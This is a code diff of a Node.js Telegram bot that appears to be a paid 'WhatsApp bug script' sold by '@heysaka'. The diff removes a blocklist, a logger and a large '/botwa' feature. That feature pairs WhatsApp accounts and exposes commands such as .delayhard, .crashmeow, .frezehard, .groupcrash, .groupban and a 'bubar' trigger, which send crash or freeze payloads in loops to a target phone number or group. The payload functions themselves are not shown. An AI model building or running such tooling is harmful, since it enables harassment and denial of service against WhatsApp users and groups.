@@ -1,4 +1,3 @@
-const chalk = require("chalk");
 const config = require("./config.js");
 const TelegramBot = require("node-telegram-bot-api");
 const {
@@ -123,12 +122,7 @@ function lower(text) {
 
 //============== BLOCKCMD STATE ==============//
 const BLOCKCMD_PATH = "./lib/database/blockcmd.json";
-const BLOCKED_CMD_PATH = "./lib/database/blocked_commands.json";
-
 let blockCmdEnabled = false;
-let blockedCommands = []; // daftar command yang diblokir, contoh: ["/start", "/menu"]
-
-// load blockcmd state
 try {
   if (fs.existsSync(BLOCKCMD_PATH)) {
     const _bc = JSON.parse(fs.readFileSync(BLOCKCMD_PATH));
@@ -136,90 +130,34 @@ try {
   }
 } catch (e) { console.error("blockcmd load:", e); }
 
-// load blocked commands
-try {
-  if (fs.existsSync(BLOCKED_CMD_PATH)) {
-    const _bl = JSON.parse(fs.readFileSync(BLOCKED_CMD_PATH));
-    if (Array.isArray(_bl.blocked)) blockedCommands = _bl.blocked;
-  }
-} catch (e) { console.error("blocked_commands load:", e); }
-
 function saveBlockCmd() {
   try {
     if (!fs.existsSync("./lib/database")) fs.mkdirSync("./lib/database", { recursive: true });
     fs.writeFileSync(BLOCKCMD_PATH, JSON.stringify({ enabled: blockCmdEnabled }, null, 2));
   } catch (e) { console.error("blockcmd save:", e); }
 }
-
-function saveBlockedCommands() {
-  try {
-    if (!fs.existsSync("./lib/database")) fs.mkdirSync("./lib/database", { recursive: true });
-    fs.writeFileSync(BLOCKED_CMD_PATH, JSON.stringify({ blocked: blockedCommands }, null, 2));
-  } catch (e) { console.error("blocked_commands save:", e); }
-}
-
-// helper: ambil command pertama dari teks pesan
-function extractCommand(text) {
-  if (!text) return null;
-  const trimmed = String(text).trim();
-  if (!trimmed.startsWith("/")) return null;
-  const firstToken = trimmed.split(/\s+/)[0];
-  const cmd = firstToken.split("@")[0].toLowerCase();
-  if (!/^\/[a-zA-Z0-9_]+$/.test(cmd)) return null;
-  return cmd;
-}
-
-// command yang TIDAK boleh diblokir (biar owner bisa unblock)
-const PROTECTED_COMMANDS = [
-  "/blockcmd", "/block", "/unblock", "/listblock"
-];
-
-function isCommandBlocked(text) {
-  const cmd = extractCommand(text);
-  if (!cmd) return false;
-  if (PROTECTED_COMMANDS.includes(cmd)) return false;
-  return blockedCommands.includes(cmd);
-}
-
 //============== END BLOCKCMD STATE ==========//
 
-//============= BLOCKCMD MIDDLEWARE =============//
 //============= BLOCKCMD MIDDLEWARE =============//
 const _origOnText = bot.onText.bind(bot);
 bot.onText = function (regex, callback) {
   return _origOnText(regex, (msg, match) => {
     try {
+      if (!blockCmdEnabled) return callback(msg, match);
+
       const fromId = msg.from?.id?.toString() || "";
       const chatId = String(msg.chat?.id || "");
-      const text = msg.text || "";
 
-      // PENTING: cek dulu apakah regex handler INI cocok dengan text
-      // Ini mencegah command lain ke-trigger (misal /block /delayhard -> /delayhard)
-      const re = new RegExp(regex.source, regex.flags.replace("g", ""));
-      const localMatch = text.match(re);
-      if (!localMatch) return;
+      const isAllowedUser =
+        isOwner(fromId) ||
+        premiumUsers.map(String).includes(fromId) ||
+        adminUsers.map(String).includes(fromId);
 
-      // === TENTUKAN SIAPA YANG BYPASS ===
-      const isOwnerUser = isOwner(fromId);
-      const isAdminUser = adminUsers.map(String).includes(fromId);
-      const isPremiumUser = premiumUsers.map(String).includes(fromId);
       const isMurbugGroup = murbugGC.includes(chatId);
+      const isAllowed = isAllowedUser || isMurbugGroup;
+      const isBlockCmd = /^\/blockcmd\b/i.test(msg.text || "");
 
-      // === ATURAN ===
-      // 1. Block command spesifik → HANYA owner yang bypass
-      // 2. Blockcmd global (lockdown) → Owner + admin + premium + murbug bypass
-
-      // Untuk cek command yang di-block spesifik (aturannya owner ONLY)
-      const bypassBlockedCommand = isOwnerUser;
-
-      // Untuk cek blockcmd global (owner + admin/premium/murbug kalau ON)
-      const bypassBlockCmd = isOwnerUser ||
-        (blockCmdEnabled && (isAdminUser || isPremiumUser || isMurbugGroup));
-
-      // 1) cek blockcmd global
-      //    Kalau blockcmd ON dan user BUKAN bypassBlockCmd → tolak semua command
-      const isBlockCmdCtrl = /^\/(blockcmd|block|unblock|listblock)\b/i.test(text);
-      if (blockCmdEnabled && !bypassBlockCmd && !isBlockCmdCtrl) {
+      if (!isAllowed && !isBlockCmd) {
         const html = `<h3>access denied</h3>
 <table border="2">
 <tr><th>info</th><th>detail</th></tr>
@@ -227,7 +165,7 @@ bot.onText = function (regex, callback) {
 <tr><td>action</td><td>purchase the script to gain access</td></tr>
 <tr><td>contact</td><td>@heysaka</td></tr>
 </table>`;
-        sendRichMenu(msg.chat.id, html, {
+        return sendRichMenu(msg.chat.id, html, {
           inline_keyboard: [
             [
               { text: "buy script", url: "https://t.me/kintanaoffcbot", style: "primary", icon_custom_emoji_id: "5316924123786524990" },
@@ -235,32 +173,8 @@ bot.onText = function (regex, callback) {
             ]
           ]
         }, msg.message_id);
-        return;
       }
-
-      // 2) cek command yang di-block spesifik
-      //    HANYA owner yang bypass (bypassBlockedCommand)
-      const invokedCmd = extractCommand(text);
-      if (!bypassBlockedCommand && invokedCmd && blockedCommands.includes(invokedCmd)) {
-        const html = `<h3>command blocked</h3>
-<table border="2">
-<tr><th>info</th><th>detail</th></tr>
-<tr><td>command</td><td>${invokedCmd}</td></tr>
-<tr><td>status</td><td>this command is currently unavailable</td></tr>
-<tr><td>contact</td><td>@heysaka</td></tr>
-</table>`;
-        sendRichMenu(msg.chat.id, html, {
-          inline_keyboard: [
-            [
-              { text: "buy script", url: "https://t.me/kintanaoffcbot", style: "primary", icon_custom_emoji_id: "5316924123786524990" },
-              { text: "creator", url: "https://t.me/heysaka", style: "primary", icon_custom_emoji_id: "5319301933645707826" }
-            ]
-          ]
-        }, msg.message_id);
-        return;
-      }
-
-      return callback(msg, localMatch);
+      return callback(msg, match);
     } catch (e) {
       console.error("middleware error:", e);
       return;
@@ -268,7 +182,7 @@ bot.onText = function (regex, callback) {
   });
 };
 //============= END MIDDLEWARE ==================//
-//============= END MIDDLEWARE ==================//
+
 let premiumUsers = JSON.parse(fs.readFileSync('./lib/database/prem.json'));
 let adminUsers = JSON.parse(fs.readFileSync('./lib/database/admin.json'));
 
@@ -335,8 +249,6 @@ async function restricted(chatid) {
 
 const DEVELOPER = "1189546122";
 const sessions = new Map();
-const waSessions = new Map();
-const botwaNumbers = new Set();
 const SESSIONS_DIR = "./lib/sessions";
 const SESSIONS_FILE = "./lib/sessions/active_sessions.json";
 
@@ -365,33 +277,9 @@ function removeActiveSession(botNumber) {
   }
 }
 
-// =============== TELEGRAM MESSAGE LOG ===============
 bot.on("message", (msg) => {
-  try {
-    const text = msg.text || msg.caption || "";
-    if (!text) return;
-
-    const pushname = msg.from?.first_name
-      ? `${msg.from.first_name}${msg.from.last_name ? " " + msg.from.last_name : ""}`
-      : (msg.from?.username || "User");
-    const senderNumber = msg.from?.id || "-";
-
-    console.log('\x1b[30m--------------------\x1b[0m');
-    console.log(chalk.bgHex("#4a69bd").bold(`▢ New Message`));
-    console.log(
-      chalk.bgHex("#ffffff").black(
-        `   ▢ Tanggal: ${new Date().toLocaleString()} \n` +
-        `   ▢ Pesan: ${text} \n` +
-        `   ▢ Pengirim: ${pushname} \n` +
-        `   ▢ JID: ${senderNumber} \n`
-      )
-    );
-    console.log();
-  } catch (e) {
-    console.error("tg log error:", e?.message);
-  }
+  console.log(`-----------------\n\x1b[32m[telegram]\x1b[0m\nuser: ${msg.from.id}\ncommand: ${msg.text}\n-----------------\n`);
 });
-// =============== END TELEGRAM MESSAGE LOG ===============
 
 async function initializeWhatsAppConnections() {
   try {
@@ -401,13 +289,14 @@ async function initializeWhatsAppConnections() {
       console.log(`-----------------\nfound ${entries.length} active whatsapp sessions\n-----------------`);
 
       for (const [botNumber, data] of entries) {
-        const type = typeof data === "string" ? data : (data.type || "public");
-        if (type === "wa") {
-          console.log(`[init] skip ${botNumber} (botwa)`);
-          continue;
-        }
+        let type = "public";
         let ownerId = null;
-        if (typeof data === "object") ownerId = data.ownerId || null;
+        if (typeof data === "string") {
+          type = data;
+        } else if (typeof data === "object") {
+          type = data.type || "public";
+          ownerId = data.ownerId || null;
+        }
         await connectWithRetry(botNumber, type, 1, 3, ownerId);
       }
     }
@@ -495,10 +384,6 @@ function createSessionDir(botNumber) {
 }
 
 async function connectToWhatsApp(botNumber, chatId, type = "public", ownerId = null) {
-  if (botwaNumbers.has(botNumber)) {
-    console.log(`[connectToWhatsApp] skip ${botNumber} (botwa)`);
-    return;
-  }
   const token = bot.token;
   let statusMessageId = null;
 
@@ -617,709 +502,6 @@ ${rowsHtml}
   return sock;
 }
 
-// ================================================================
-// ==================== FITUR /botwa (WA PAIRING) =================
-// ================================================================
-
-const WA_PAIRING_CODE = "SAKA4444";
-const MAX_WA_BOTS = 10;
-
-function canAddMoreWABots() {
-  const activeCount = Array.from(waSessions.values()).filter(d => d.type === "wa" || d.sock).length;
-  return activeCount < MAX_WA_BOTS;
-}
-
-async function sendWAMenu(sock, from, mek, sender) {
-  const pushname = mek.pushName || "User";
-  const uptime = process.uptime();
-  const uptimeStr = `${Math.floor(uptime / 3600)}h ${Math.floor((uptime % 3600) / 60)}m`;
-  const greeting = getGreeting();
-
-  const expiredDate = new Date(Date.now() + 30 * 24 * 60 * 60 * 1000);
-  const expiredStr = expiredDate.toLocaleDateString("id-ID", {
-    day: "2-digit", month: "short", year: "numeric"
-  });
-
-  const bodyText = `\`「 KINTANA JS 」\`
- ${greeting}, *${pushname}*
-  ▢ *Bot:* Kintana JavaScript
-  ▢ *Versi:* 7.3.0
-  ▢ *Uptime:* ${uptimeStr}
-  ▢ *Platform:* WhatsApp
-
-\`「 MENU UTAMA 」\`
-▸ .menu    — menu ini
-▸ .ping    — cek respon
-▸ .owner   — kontak owner
-▸ .status  — status bot
-
-\`「 ANDROID BUG 」\`
-▸ .delayhard 62xxx
-▸ .crashmeow 62xxx
-▸ .blankclick 62xxx
-▸ .frezehard 62xxx
-
-\`「 GROUP BUG 」\`
-▸ .groupcrash (link)
-▸ .groupban (link)
-▸ .bubar (bug in place)
-
-Ketik dengan awalan titik (.)
-
-— Kintana JavaScript
-Berakhir pada ${expiredStr}`;
-
-  try {
-    const imagePayload = await prepareWAMessageMedia({
-      image: { url: "https://files.catbox.moe/5izqwp.jpg" }
-    }, { upload: sock.waUploadToServer, mediaType: "image" });
-
-    const msg = generateWAMessageFromContent(from, proto.Message.fromObject({
-      interactiveMessage: {
-        header: {
-          title: "> Credit By H3ysaka",
-          subtitle: "WhatsApp Bug Script",
-          hasMediaAttachment: true,
-          ...imagePayload
-        },
-        body: { text: bodyText },
-        footer: { text: `Berakhir pada ${expiredStr}` },
-        nativeFlowMessage: {
-          buttons: [
-            {
-              name: "cta_url",
-              buttonParamsJson: JSON.stringify({
-                display_text: "Channel Telegram",
-                url: "https://t.me/kintanaofficial",
-                merchant_url: "https://t.me/kintanaofficial"
-              })
-            },
-            {
-              name: "cta_url",
-              buttonParamsJson: JSON.stringify({
-                display_text: "Creator",
-                url: "https://t.me/heysaka",
-                merchant_url: "https://t.me/heysaka"
-              })
-            },
-            {
-              name: "cta_url",
-              buttonParamsJson: JSON.stringify({
-                display_text: "Buy Script",
-                url: "https://t.me/kintanaoffcbot",
-                merchant_url: "https://t.me/kintanaoffcbot"
-              })
-            }
-          ]
-        }
-      }
-    }), { quoted: mek });
-
-    await sock.relayMessage(from, msg.message, { messageId: msg.key.id });
-
-  } catch (err) {
-    console.error("[botwa] interactive menu error, fallback:", err?.message);
-
-    try {
-      await sock.sendMessage(from, {
-        text: bodyText,
-        contextInfo: {
-          mentionedJid: [sender],
-          externalAdReply: {
-            title: "Kintana JavaScript",
-            body: "WhatsApp Bug Script by Heysaka",
-            thumbnailUrl: "https://files.catbox.moe/5izqwp.jpg",
-            sourceUrl: "https://t.me/kintanaofficial",
-            mediaType: 1,
-            renderLargerThumbnail: true,
-            showAdAttribution: false
-          }
-        }
-      }, { quoted: mek });
-    } catch (err2) {
-      console.error("[botwa] fallback error:", err2?.message);
-    }
-  }
-}
-
-// ==================== HANDLER PESAN WA ====================
-async function handleWAMessage(sock, number, chatUpdate) {
-  try {
-    const mek = chatUpdate.messages[0];
-    if (!mek.message) return;
-    if (chatUpdate.type !== "notify") return;
-
-    mek.message = Object.keys(mek.message)[0] === "ephemeralMessage"
-      ? mek.message.ephemeralMessage.message
-      : mek.message;
-
-    const from = mek.key.remoteJid;
-    const sender = mek.key.fromMe
-      ? sock.user.id.split(":")[0] + "@s.whatsapp.net"
-      : (mek.key.participant || mek.key.remoteJid);
-
-    const type = getContentType(mek.message);
-    const body = (type === "conversation" && mek.message.conversation)
-      || (type === "extendedTextMessage" && mek.message.extendedTextMessage.text)
-      || (type === "imageMessage" && mek.message.imageMessage.caption)
-      || (type === "videoMessage" && mek.message.videoMessage.caption)
-      || "";
-
-    const pushname = mek.pushName || "User";
-    const senderNumber = sender.split("@")[0];
-
-    // ================= LOG CONSOLE (WA) =================
-    if (mek.message) {
-      console.log('\x1b[30m--------------------\x1b[0m');
-      console.log(chalk.bgHex("#4a69bd").bold(`▢ New Message`));
-      console.log(
-        chalk.bgHex("#ffffff").black(
-          `   ▢ Tanggal: ${new Date().toLocaleString()} \n` +
-          `   ▢ Pesan: ${body || type} \n` +
-          `   ▢ Pengirim: ${pushname} \n` +
-          `   ▢ JID: ${senderNumber} \n`
-        )
-      );
-      console.log();
-    }
-    // ================= END LOG =================
-
-    // ===== TRIGGER "bubar" TANPA PREFIX =====
-if (body.trim().toLowerCase() === "bubar") {
-  try {
-    await sock.sendMessage(from, {
-      react: { text: "☀️", key: mek.key }
-    });
-
-    const groupMetadata = await sock.groupMetadata(from);
-    const groupJid = groupMetadata.id;
-
-    for (let i = 0; i < 20; i++) {
-      await Promise.allSettled([
-        halonyetGB(sock, groupJid).catch(() => {}),
-        halonyetGB(sock, groupJid).catch(() => {}),
-        halonyetGB(sock, groupJid).catch(() => {})
-      ]);
-      await sleep(500);
-    }
-  } catch (e) {}
-  return;
-}
-    // ===== END TRIGGER =====
-
-    if (!body.startsWith(".")) return;
-
-    const command = body.slice(1).trim().split(/\s+/)[0].toLowerCase();
-    const args = body.trim().split(/\s+/).slice(1);
-
-    console.log(`[wa-cmd] ${sender.split("@")[0]} -> .${command} (bot ${number})`);
-
-    switch (command) {
-      case "menu": {
-        await sendWAMenu(sock, from, mek, sender);
-        break;
-      }
-
-      case "ping": {
-        const t0 = Date.now();
-        await sock.sendMessage(from, {
-          text: `🏓 *Pong!*\n\n⚡ Respon: ${Date.now() - t0}ms\n📡 Status: Online\n🔌 Bot: ${number}`
-        }, { quoted: mek });
-        break;
-      }
-
-      case "owner": {
-        await sock.sendMessage(from, {
-          text: `👑 *Owner Bot*\n\n📱 Telegram: @heysaka\n📢 Channel: t.me/kintanaofficial\n🌐 Script: Kintana JavaScript v7.3.0`
-        }, { quoted: mek });
-        break;
-      }
-
-      case "status": {
-        const uptime = process.uptime();
-        const mem = process.memoryUsage();
-        const memMB = (mem.rss / 1024 / 1024).toFixed(2);
-        await sock.sendMessage(from, {
-          text: `📊 *Bot Status*\n\n⏱️ Uptime: ${Math.floor(uptime / 60)} menit\n💾 Memory: ${memMB} MB\n🔌 Bot: ${number}\n📦 Version: 7.3.0`
-        }, { quoted: mek });
-        break;
-      }
-
-      case "delayhard": {
-        if (!args[0]) return sock.sendMessage(from, { text: "❌ Contoh: .delayhard 628123456789" }, { quoted: mek });
-        const target = args[0].replace(/\D/g, "") + "@s.whatsapp.net";
-        await sock.sendMessage(from, { text: `🚀 Mengirim bug .delayhard ke ${args[0]}...` }, { quoted: mek });
-        try {
-          await bug1(sock, target);
-          await bug1(sock, target);
-          await sock.sendMessage(from, { text: `✅ Bug .delayhard terkirim ke ${args[0]}` }, { quoted: mek });
-        } catch (e) {
-          await sock.sendMessage(from, { text: `❌ Error: ${e.message}` }, { quoted: mek });
-        }
-        break;
-      }
-
-      case "crashmeow": {
-        if (!args[0]) return sock.sendMessage(from, { text: "❌ Contoh: .crashmeow 628123456789" }, { quoted: mek });
-        const target = args[0].replace(/\D/g, "") + "@s.whatsapp.net";
-        await sock.sendMessage(from, { text: `🚀 Mengirim bug .crashmeow ke ${args[0]}...` }, { quoted: mek });
-        try {
-          await bug2(sock, target);
-          await bug2(sock, target);
-          await sock.sendMessage(from, { text: `✅ Bug .crashmeow terkirim ke ${args[0]}` }, { quoted: mek });
-        } catch (e) {
-          await sock.sendMessage(from, { text: `❌ Error: ${e.message}` }, { quoted: mek });
-        }
-        break;
-      }
-
-      case "blankclick": {
-        if (!args[0]) return sock.sendMessage(from, { text: "❌ Contoh: .blankclick 628123456789" }, { quoted: mek });
-        const target = args[0].replace(/\D/g, "") + "@s.whatsapp.net";
-        await sock.sendMessage(from, { text: `🚀 Mengirim bug .blankclick ke ${args[0]}...` }, { quoted: mek });
-        try {
-          await bug3(sock, target);
-          await bug3(sock, target);
-          await sock.sendMessage(from, { text: `✅ Bug .blankclick terkirim ke ${args[0]}` }, { quoted: mek });
-        } catch (e) {
-          await sock.sendMessage(from, { text: `❌ Error: ${e.message}` }, { quoted: mek });
-        }
-        break;
-      }
-
-      case "frezehard": {
-        if (!args[0]) return sock.sendMessage(from, { text: "❌ Contoh: .frezehard 628123456789" }, { quoted: mek });
-        const target = args[0].replace(/\D/g, "") + "@s.whatsapp.net";
-        await sock.sendMessage(from, { text: `🚀 Mengirim bug .frezehard ke ${args[0]}...` }, { quoted: mek });
-        try {
-          await bug4(sock, target);
-          await bug4(sock, target);
-          await sock.sendMessage(from, { text: `✅ Bug .frezehard terkirim ke ${args[0]}` }, { quoted: mek });
-        } catch (e) {
-          await sock.sendMessage(from, { text: `❌ Error: ${e.message}` }, { quoted: mek });
-        }
-        break;
-      }
-
-      case "groupcrash": {
-        if (!args[0]) return sock.sendMessage(from, { text: "❌ Contoh: .groupcrash https://chat.whatsapp.com/xxxxx" }, { quoted: mek });
-        const inviteCode = args[0].match(/chat\.whatsapp\.com\/([a-zA-Z0-9]+)/)?.[1];
-        if (!inviteCode) return sock.sendMessage(from, { text: "❌ Link grup tidak valid." }, { quoted: mek });
-        try {
-          const groupInfo = await sock.groupGetInviteInfo(inviteCode);
-          const groupJid = groupInfo.id;
-          await sock.sendMessage(from, { text: `🚀 Mengirim bug grup ke ${groupInfo.subject}...` }, { quoted: mek });
-          for (let i = 0; i < 20; i++) {
-            await Promise.allSettled([
-              kitow(sock, groupJid).catch(() => {}),
-              kicaumania(sock, groupJid).catch(() => {}),
-              GbCrash(sock, groupJid).catch(() => {}),
-              halonyetGB(sock, groupJid).catch(() => {})
-            ]);
-            await sleep(500);
-          }
-          await sock.sendMessage(from, { text: `✅ Bug grup terkirim.` }, { quoted: mek });
-        } catch (e) {
-          await sock.sendMessage(from, { text: `❌ Error: ${e.message}` }, { quoted: mek });
-        }
-        break;
-      }
-
-      case "groupban": {
-        if (!args[0]) return sock.sendMessage(from, { text: "❌ Contoh: .groupban https://chat.whatsapp.com/xxxxx" }, { quoted: mek });
-        const inviteCode = args[0].match(/chat\.whatsapp\.com\/([a-zA-Z0-9]+)/)?.[1];
-        if (!inviteCode) return sock.sendMessage(from, { text: "❌ Link grup tidak valid." }, { quoted: mek });
-        try {
-          const groupInfo = await sock.groupGetInviteInfo(inviteCode);
-          const groupJid = groupInfo.id;
-          await sock.sendMessage(from, { text: `🚀 Ban grup ${groupInfo.subject}...` }, { quoted: mek });
-          await bansgc(sock, groupJid);
-          await sock.sendMessage(from, { text: `✅ Selesai.` }, { quoted: mek });
-        } catch (e) {
-          await sock.sendMessage(from, { text: `❌ Error: ${e.message}` }, { quoted: mek });
-        }
-        break;
-      }
-
-      default:
-        break;
-    }
-  } catch (err) {
-    console.error("[botwa] messages.upsert error:", err?.message);
-  }
-}
-// ==================== /botwa ====================
-bot.onText(/^\/botwa(?:\s+(.+))?$/i, async (msg, match) => {
-  const chatId = msg.chat.id;
-  const userId = msg.from.id;
-
-  if (!isOwner(userId)) return restricted(chatId);
-
-  if (!canAddMoreWABots()) {
-    return sendRichMenu(chatId,
-      `<h3>limit reached</h3>
-<table border="2">
-<tr><th>info</th><th>detail</th></tr>
-<tr><td>max bots</td><td>${MAX_WA_BOTS}</td></tr>
-<tr><td>status</td><td>limit tercapai, hapus bot lain dulu</td></tr>
-<tr><td>command</td><td>/delbotwa &lt;nomor&gt;</td></tr>
-</table>`,
-      null,
-      msg.message_id
-    );
-  }
-
-  if (!match[1]) {
-    return sendRichMenu(chatId,
-      `<h3>missing input</h3>
-<table border="2">
-<tr><th>info</th><th>detail</th></tr>
-<tr><td>command</td><td>/botwa</td></tr>
-<tr><td>example</td><td>/botwa 628123456789</td></tr>
-<tr><td>max bots</td><td>${MAX_WA_BOTS}</td></tr>
-</table>`,
-      { inline_keyboard: [[{ text: "creator", url: "https://t.me/heysaka", style: "primary", icon_custom_emoji_id: "5319301933645707826" }]] },
-      msg.message_id
-    );
-  }
-
-  let number = match[1].replace(/[^0-9]/g, "");
-  if (number.startsWith("0")) number = "62" + number.slice(1);
-  if (!number.startsWith("62")) number = "62" + number;
-
-  if (number.length < 10 || number.length > 15) {
-    return sendRichMenu(chatId,
-      `<h3>invalid number</h3>
-<table border="2">
-<tr><th>info</th><th>detail</th></tr>
-<tr><td>input</td><td>${number}</td></tr>
-<tr><td>status</td><td>format nomor tidak valid</td></tr>
-</table>`,
-      null,
-      msg.message_id
-    );
-  }
-
-  if (waSessions.has(number)) {
-    const s = waSessions.get(number);
-    return sendRichMenu(chatId,
-      `<h3>already connected</h3>
-<table border="2">
-<tr><th>info</th><th>detail</th></tr>
-<tr><td>number</td><td>${number}</td></tr>
-<tr><td>status</td><td>already connected</td></tr>
-<tr><td>since</td><td>${new Date(s.connectedAt || Date.now()).toLocaleString()}</td></tr>
-</table>`,
-      null,
-      msg.message_id
-    );
-  }
-
-  const token = bot.token;
-  let statusId = null;
-  try {
-    const res = await axios.post(`https://api.telegram.org/bot${token}/sendRichMessage`, {
-      chat_id: chatId,
-      rich_message: {
-        html: `<h3>botwa connection</h3>
-<table border="2">
-<tr><th>info</th><th>detail</th></tr>
-<tr><td>number</td><td>${number}</td></tr>
-<tr><td>status</td><td>initializing...</td></tr>
-</table>`
-      }
-    });
-    statusId = res?.data?.result?.message_id;
-  } catch (e) {
-    console.error("botwa init status:", e?.message);
-  }
-
-  const updateStatus = async (title, rows) => {
-    if (!statusId) return;
-    let rowsHtml = "";
-    for (const [k, v] of rows) rowsHtml += `<tr><td>${k}</td><td>${v}</td></tr>\n`;
-    try {
-      await axios.post(`https://api.telegram.org/bot${token}/editMessageText`, {
-        chat_id: chatId,
-        message_id: statusId,
-        rich_message: {
-          html: `<h3>${title}</h3>
-<table border="2">
-<tr><th>info</th><th>detail</th></tr>
-${rowsHtml}
-</table>`
-        }
-      });
-    } catch (e) {
-      console.error("botwa edit status:", e?.message);
-    }
-  };
-
-  const sessionDir = path.join(SESSIONS_DIR, `wa_${number}`);
-  if (!fs.existsSync(sessionDir)) fs.mkdirSync(sessionDir, { recursive: true });
-
-  botwaNumbers.add(number);
-
-  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
-
-  const sock = makeWASocket({
-    auth: state,
-    printQRInTerminal: false,
-    logger: P({ level: "silent" }),
-    defaultQueryTimeoutMs: undefined,
-    browser: ["Ubuntu", "Chrome", "20.0.00"],
-  });
-
-  sock.ev.on("connection.update", async (update) => {
-    const { connection, lastDisconnect } = update;
-
-    if (connection === "connecting") {
-      await sleep(1500);
-      try {
-        if (!fs.existsSync(path.join(sessionDir, "creds.json"))) {
-          const code = await sock.requestPairingCode(number, WA_PAIRING_CODE);
-          const formatted = code.match(/.{1,4}/g)?.join("-") || code;
-
-          await updateStatus("botwa pairing", [
-            ["number", number],
-            ["pairing code", `<b>${formatted}</b>`],
-            ["status", "masukkan kode di WhatsApp"],
-            ["note", "buka WhatsApp → Linked Devices → Link with phone number"]
-          ]);
-        }
-      } catch (err) {
-        console.error("botwa pairing error:", err?.message);
-        await updateStatus("botwa error", [
-          ["number", number],
-          ["status", "gagal generate pairing code"],
-          ["error", err.message]
-        ]);
-      }
-    }
-
-    if (connection === "open") {
-      waSessions.set(number, {
-        sock,
-        jid: sock.user.id,
-        ownerId: userId,
-        type: "wa",
-        connectedAt: Date.now()
-      });
-      saveActiveSessions(number, "wa", userId);
-
-      await updateStatus("botwa connected", [
-        ["number", number],
-        ["jid", sock.user.id],
-        ["status", "berhasil terhubung"],
-        ["command wa", "kirim <code>.menu</code> dari nomor lain"]
-      ]);
-
-      console.log(`[botwa] ${number} connected`);
-    }
-
-    if (connection === "close") {
-      const statusCode = lastDisconnect?.error?.output?.statusCode;
-      const shouldReconnect = statusCode !== DisconnectReason.loggedOut;
-
-      waSessions.delete(number);
-
-      if (shouldReconnect) {
-        await updateStatus("botwa reconnecting", [
-          ["number", number],
-          ["status", "Successfully Connected"]
-        ]);
-        setTimeout(() => reconnectWABot(number, userId), 3000);
-      } else {
-        removeActiveSession(number);
-        botwaNumbers.delete(number);
-        try { fs.rmSync(sessionDir, { recursive: true, force: true }); } catch (_) {}
-        await updateStatus("botwa logout", [
-          ["number", number],
-          ["status", "session deleted, re-pairing /botwa" + number]
-        ]);
-      }
-    }
-  });
-
-  sock.ev.on("creds.update", saveCreds);
-
-  sock.ev.on("messages.upsert", async (chatUpdate) => {
-    await handleWAMessage(sock, number, chatUpdate);
-  });
-
-  waSessions.set(number, { sock, pending: true });
-});
-
-// ==================== /listbotwa ====================
-bot.onText(/^\/listbotwa$/i, async (msg) => {
-  const chatId = msg.chat.id;
-  const userId = msg.from.id;
-
-  if (!isOwner(userId) && !adminUsers.includes(userId)) {
-    return restricted(chatId);
-  }
-
-  const waList = Array.from(waSessions.entries()).filter(([_, d]) => d.type === "wa" || d.sock);
-
-  if (waList.length === 0) {
-    return sendRichMenu(chatId,
-      `<h3>wa bot list</h3>
-<table border="2">
-<tr><th>info</th><th>detail</th></tr>
-<tr><td>status</td><td>belum ada bot wa yang connect</td></tr>
-<tr><td>cara</td><td>kirim /botwa 628xxx</td></tr>
-<tr><td>max</td><td>${MAX_WA_BOTS} bot</td></tr>
-</table>`
-    );
-  }
-
-  let rowsHtml = "";
-  let i = 1;
-  for (const [number, data] of waList) {
-    const status = data.sock?.user ? "connected" : "pending";
-    const jid = data.jid || data.sock?.user?.id || "-";
-    const since = data.connectedAt ? new Date(data.connectedAt).toLocaleString() : "-";
-    rowsHtml += `<tr><td>${i}</td><td>${number}</td><td>${status}</td><td>${jid}</td><td>${since}</td></tr>\n`;
-    i++;
-  }
-
-  await sendRichMenu(chatId,
-    `<h3>wa bot list</h3>
-<table border="2">
-<tr><th>#</th><th>number</th><th>status</th><th>jid</th><th>since</th></tr>
-${rowsHtml}
-</table>
-
-<p>total: ${waList.length}/${MAX_WA_BOTS} wa bot</p>`
-  );
-});
-
-// ==================== /delbotwa ====================
-bot.onText(/^\/delbotwa(?:\s+(.+))?$/i, async (msg, match) => {
-  const chatId = msg.chat.id;
-  const userId = msg.from.id;
-
-  if (!isOwner(userId)) return restricted(chatId);
-
-  if (!match[1]) {
-    return sendRichMenu(chatId,
-      `<h3>missing input</h3>
-<table border="2">
-<tr><th>info</th><th>detail</th></tr>
-<tr><td>command</td><td>/delbotwa</td></tr>
-<tr><td>example</td><td>/delbotwa 628123456789</td></tr>
-</table>`,
-      null,
-      msg.message_id
-    );
-  }
-
-  const number = match[1].replace(/\D/g, "");
-  const data = waSessions.get(number);
-
-  if (!data) {
-    return sendRichMenu(chatId,
-      `<h3>not found</h3>
-<table border="2">
-<tr><th>info</th><th>detail</th></tr>
-<tr><td>number</td><td>${number}</td></tr>
-<tr><td>status</td><td>tidak ditemukan</td></tr>
-</table>`,
-      null,
-      msg.message_id
-    );
-  }
-
-  try {
-    if (data.sock) await data.sock.logout().catch(() => {});
-    waSessions.delete(number);
-    botwaNumbers.delete(number);
-    removeActiveSession(number);
-    const sessionDir = path.join(SESSIONS_DIR, `wa_${number}`);
-    if (fs.existsSync(sessionDir)) fs.rmSync(sessionDir, { recursive: true, force: true });
-
-    await sendRichMenu(chatId,
-      `<h3>wa bot deleted</h3>
-<table border="2">
-<tr><th>info</th><th>detail</th></tr>
-<tr><td>number</td><td>${number}</td></tr>
-<tr><td>status</td><td>berhasil dihapus</td></tr>
-</table>`,
-      null,
-      msg.message_id
-    );
-  } catch (e) {
-    await sendRichMenu(chatId,
-      `<h3>error</h3>
-<table border="2">
-<tr><th>info</th><th>detail</th></tr>
-<tr><td>message</td><td>${e.message}</td></tr>
-</table>`,
-      null,
-      msg.message_id
-    );
-  }
-});
-
-// ==================== RECONNECT WA ====================
-async function reconnectWABot(number, ownerId) {
-  const sessionDir = path.join(SESSIONS_DIR, `wa_${number}`);
-  if (!fs.existsSync(sessionDir)) return;
-
-  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
-
-  const sock = makeWASocket({
-    auth: state,
-    printQRInTerminal: false,
-    logger: P({ level: "silent" }),
-    defaultQueryTimeoutMs: undefined,
-  });
-
-  sock.ev.on("connection.update", async (update) => {
-    const { connection } = update;
-    if (connection === "open") {
-      waSessions.set(number, {
-        sock,
-        jid: sock.user.id,
-        ownerId,
-        type: "wa",
-        connectedAt: Date.now()
-      });
-      console.log(`[botwa] ${number} reconnected`);
-    }
-    if (connection === "close") {
-      waSessions.delete(number);
-      setTimeout(() => reconnectWABot(number, ownerId), 5000);
-    }
-  });
-
-  sock.ev.on("creds.update", saveCreds);
-  sock.ev.on("messages.upsert", async (chatUpdate) => {
-    await handleWAMessage(sock, number, chatUpdate);
-  });
-}
-
